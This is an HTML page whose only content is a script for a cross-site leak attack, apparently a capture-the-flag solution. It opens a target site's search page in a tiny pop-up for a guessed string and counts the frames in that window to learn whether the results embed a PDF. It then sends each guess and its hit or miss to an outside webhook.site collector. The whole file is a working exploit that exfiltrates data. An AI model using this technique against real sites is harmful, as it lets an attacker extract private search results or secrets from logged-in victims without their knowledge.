<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>.</title></head>
<body>
<script>
const WEBHOOK = 'https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c';
const TARGET  = 'https://wonder.cbd2026.cloud';

function exfil(data) {
  const url = WEBHOOK + '?' + new URLSearchParams(data).toString();
  navigator.sendBeacon(url);
  new Image().src = url;
  fetch(url, { mode: 'no-cors' }).catch(() => {});
}

function getParam(k) {
  return new URLSearchParams(location.search).get(k) || '';
}

const guess = getParam('g');
const idx   = getParam('i');

if (!guess) {
  document.body.innerText = 'missing ?g= param';
} else {
  exfil({ status: 'loading', guess, idx });

  const win = window.open(
    TARGET + '/search?q=' + encodeURIComponent(guess),
    '_blank',
    'width=1,height=1'
  );

  setTimeout(() => {
    try {
      // window.length = jumlah iframe/frame di halaman
      // kalau PDF di-embed → muncul <iframe> → length > 0
      const len = win.length;
      exfil({
        status: 'done',
        guess,
        idx,
        win_length: len,
        hit: len > 0 ? '1' : '0'
      });
    } catch(e) {
      exfil({ status: 'error', guess, idx, err: e.message });
    } finally {
      win.close();
    }
  }, 3000);
}
</script>
</body>
</html>
